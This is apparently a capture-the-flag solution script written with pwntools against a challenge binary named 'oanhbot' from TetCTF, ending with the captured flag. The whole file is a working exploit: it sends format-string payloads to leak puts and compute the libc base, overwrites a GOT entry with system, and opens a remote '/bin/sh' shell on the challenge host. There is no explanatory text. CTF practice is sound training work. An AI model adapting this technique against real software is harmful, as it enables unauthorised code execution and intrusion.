from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./oanhbot')
	puts_offset = 0x06f690
	system_offset = 0x045390
else:
	libc = ELF("./libc-2.23.so")
	puts_offset = libc.symbols['puts']
	system_offset = libc.symbols['system']
	host, port = "54.157.217.45", 29669
	r = remote(host, port)

raw_input('debug')

r.sendlineafter("your Hero: ", "linh")
r.sendlineafter("Your Choice: ", "5")
r.sendlineafter("Bot Name: ","aaaaaaaaaaaaaaa")
r.sendlineafter("(Y/N) ", "Y")

buf = "aaaa%" + str(129)+ "x%13$hhn"
buf += "%" + str(135)+ "x%14$hhn"
buf += "%" + str(12)+ "x%15$hhn"
buf += "%" + str(8)+ "x%16$hhn"
buf += "%" + str(64)+ "x%17$hhn"
buf += "%" + str(160)+ "x%18$hhn"
buf += p64(0x602030)
buf += p64(0x602031)
buf += p64(0x602190)
buf += p64(0x602191)
buf += p64(0x602192)
buf += p64(0x602193)

r.sendlineafter("Status: ", buf)
r.recvuntil("* NAME: ")
res = r.recv(6) + "\x00\x00"
log.info("%#x" %u64(res))
puts_add = u64(res)
libc_base = puts_add - puts_offset
system_add = libc_base + system_offset

r.sendlineafter("(Y/N) ", "Y")

buf1 = "aaaaa%" + str(91)+ "x%10$hhn"
buf1 += "%" + str(171)+ "x%11$hhn"
buf1 += "%" + str(109)+ "x%12$hhn"

buf1 += p64(0x602030)
buf1 += p64(0x602031)
buf1 += p64(0x602190)

r.sendlineafter("Status: ", buf1)
buf2 = p64(system_add)
buf2 += '\x00'
r.sendlineafter("Name of your Hero: ", buf2)
r.sendlineafter("Your Choice: ", "/bin/sh")

r.interactive()
r.close()

#TetCTF{04nh_b0t_s0_3asy}